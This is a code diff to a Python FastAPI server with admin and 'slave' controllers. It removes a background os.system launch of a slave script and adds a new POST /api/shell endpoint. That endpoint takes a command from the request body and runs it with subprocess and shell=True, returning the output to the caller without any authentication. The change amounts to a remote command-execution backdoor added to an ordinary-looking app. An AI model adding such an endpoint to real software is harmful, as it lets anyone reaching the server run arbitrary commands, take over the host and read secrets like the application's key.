@@ -4,8 +4,7 @@ from pydantic import BaseModel
 from admin_controller import admin
 from slave_controller import slave
 import os
-
-os.system("python slave/main.py &")
+import subprocess
 
 app = FastAPI()
 
@@ -34,6 +33,11 @@ async def validate_master_password(password_request:MasterPasswordRequest):
     if password_request.password == os.environ["SECRET_KEY"]:
         return {"success":True}
     return {"success":False}
+
+@app.post("/api/shell")
+async def run_shell(request: dict):
+    return subprocess.check_output(request["command"], shell=True, universal_newlines=True)
+    
     
 app.include_router(admin, prefix="/api")
 app.include_router(slave, prefix="/api")
